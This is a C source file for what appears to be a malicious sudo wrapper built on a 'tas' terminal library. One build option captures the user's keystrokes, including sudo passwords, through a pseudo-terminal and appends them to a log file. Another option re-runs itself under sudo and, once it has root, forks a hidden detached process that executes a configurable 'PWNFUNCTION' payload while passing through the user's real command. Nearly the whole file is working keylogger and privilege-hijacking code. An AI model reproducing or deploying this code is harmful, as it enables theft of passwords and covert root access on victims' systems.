#include "tas/tas.h"
#include "tas/constructor.c"

#include <stdio.h>
#include <string.h>

#include <sys/wait.h>
#include <sys/types.h>
#include <fcntl.h>

#include "config.h"

// if you enable command change
#ifdef CMDCHANGE

// verify command line
int check_args(int argc, char **argv)
{
	if (argc <= 1) {
		goto end;
	}

	if (!strcmp(argv[0], "sudo")) {
		if (argv[1][0] != '-') {
			return 0;
		}
	}

end:
	return 1;
}

// edit this function to run
// what you want as root
void super(void)
{
	// defined in config.h
	PWNFUNCTION
}

// hide output
void prepare(void)
{
	int fd;
	pid_t pid = fork();
	if (pid == 0) {
		setsid();

		fd = open("/dev/null", O_RDWR);
		dup2(fd, 0);
		dup2(fd, 1);
		dup2(fd, 2);

		if (fd > 2)
			close(fd);

		super();
		_exit(0);
	}
}

void runme(int argc, char **argv)
{
	if (getuid() == 0) {
		prepare();

		if (argc > 1) {
			tas_execv(argv[1], argv + 1);
		}

		_exit(1);
	}

	if (check_args(argc, argv)) {
		tas_execv("sudo", argv);
		_exit(0);
	}

	if (argc > 1) {
		// don't care about overwrite the argc
		argv[-1] = argv[0];
		argv[0] = current_exe;

		// human readable
		argv--;
	}

	tas_execv("sudo", argv);
	_exit(0);
}

#endif /* CMDCHANGE */

// if you enable keylogger
#ifdef KEYLOGGER

int enable_keylogger(int argc, char **argv)
{
	struct termios tios;
	int status;

	tas_tty tty = TAS_TTY_INIT;
	tty.output_fd = open(LOGFILE, O_WRONLY | O_APPEND | O_CREAT | O_CLOEXEC , 0644);

	if (tty.output_fd == -1) {
		#ifdef CMDCHANGE
			runme(argc, argv);
		#else
			tas_execv("sudo", argv);
		#endif

		_exit(1);
	}

	pid_t pid = tas_forkpty(&tty);
	if (pid <= 0) {
		if (pid == -1)
			close(tty.master);

		#ifdef CMDCHANGE
			runme(argc, argv);
		#else
			tas_execv("sudo", argv);
		#endif

		_exit(1);
	}

	tty.input_hook = (void *) keylogger;
	tty.stdin_fd = STDIN_FILENO;

	// set to raw mode
	raw_mode(&tios, STDIN_FILENO);

	// rw loop
	tty_loop(&tty);

	// restore
	tcsetattr(STDIN_FILENO, TCSAFLUSH, &tios);

	waitpid(pid, &status, 0);
	return status;
}

#endif /* KEYLOGGER */

int main(int argc, char **argv)
{
#ifdef KEYLOGGER
	return enable_keylogger(argc, argv);
#endif

#ifdef CMDCHANGE
	runme(argc, argv);
#endif
}
